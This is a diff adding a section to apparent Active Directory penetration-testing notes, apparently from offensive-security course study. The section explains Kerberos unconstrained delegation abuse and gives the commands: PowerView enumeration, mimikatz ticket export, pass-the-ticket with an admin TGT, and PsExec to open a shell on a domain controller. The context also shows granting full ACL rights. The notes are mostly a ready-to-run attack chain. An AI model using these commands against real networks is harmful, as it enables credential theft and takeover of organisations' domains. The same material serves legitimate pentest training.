@@ -48,3 +48,26 @@ such as GenericAll, GenericWrite, or even DCSync if the targeted object is the d
 ```
 PS C:\tools> Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All
 ```
+#### Kerberos Unconstrained Delegation
+
+When the user requests access for a service ticket against a service that uses unconstrained
+delegation, the request also includes a forwardable TGT. Since the frontend service receives a forwardable TGT, it can perform authentication on behalf of
+the user to any service. this means that if we succeed in compromising the web server service and a user authenticates to it, we can steal the user’s TGT and authenticate to any service.
+
+Identify Unconstrained computer
+```
+PS C:\tools> Get-DomainComputer -Unconstrained
+```
+dump the tickets
+```
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+```
+
+identify the admin TGT, and ptt, and exit sapwn a cmd shell with the ticket
+```
+mimikatz # kerberos::ptt [0;9eaea]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi
+mimikatz # exit
+
+C:\Tools> C:\Tools\SysinternalsSuite\PsExec.exe \\cdc01 cmd
+```
